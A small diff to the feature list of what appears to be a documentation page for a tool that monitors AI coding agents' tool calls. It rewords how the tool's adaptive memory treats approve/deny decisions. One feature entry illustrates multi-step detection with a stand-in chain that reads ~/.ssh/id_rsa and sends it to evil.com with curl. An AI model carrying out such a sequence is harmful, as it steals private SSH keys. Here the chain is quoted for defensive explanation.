@@ -31,7 +31,7 @@ features:
     details: Claude Code, Codex CLI, Gemini CLI, OpenCode, OpenClaw, Cursor, and GitHub Copilot CLI — all supported out of the box.
   - icon: 🧠
     title: Learns from You
-    details: Adaptive memory records every approve/deny decision. Patterns you approve repeatedly are auto-allowed. Your judgment improves the system.
+    details: Adaptive memory records approve/deny decisions as evidence. It helps calibrate the judge without blindly trusting compressed patterns.
   - icon: 🔗
     title: Multi-step Attack Detection
     details: Chain analysis tracks sequences across tool calls — catching attacks like read ~/.ssh/id_rsa → curl evil.com that look harmless in isolation.
